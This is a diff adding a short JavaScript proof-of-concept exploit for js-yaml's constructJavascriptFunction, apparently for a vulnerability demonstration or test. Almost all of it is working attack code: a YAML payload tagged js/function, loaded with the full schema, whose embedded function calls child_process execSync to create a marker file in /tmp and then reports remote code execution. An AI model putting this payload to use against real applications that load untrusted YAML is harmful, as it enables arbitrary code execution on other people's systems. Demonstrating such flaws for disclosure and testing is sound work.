@@ -1,0 +1,23 @@
+```javascript
+// Exploit for js-yaml's constructJavascriptFunction (lib/js-yaml/type/js/function.js)
+// Deserializing an untrusted YAML document with the !!js/function tag causes
+// js-yaml to build and invoke a `new Function(...)` from attacker-controlled
+// source, leading to arbitrary code execution.
+
+const yaml = require("./node_modules/js-yaml");
+
+const payload = [
+  'exploit: !<tag:yaml.org,2002:js/function> >',
+  '  function () {',
+  "    process.mainModule.require('child_process').execSync('touch /tmp/pwned_js_yaml');",
+  '  }'
+].join('\n');
+
+// constructJavascriptFunction() is invoked here while resolving the js/function tag
+const doc = yaml.load(payload, { schema: yaml.DEFAULT_FULL_SCHEMA });
+
+// Invoking the deserialized function executes the attacker-supplied code
+doc.exploit();
+
+console.log('RCE triggered, file created:', require('fs').existsSync('/tmp/pwned_js_yaml'));
+```
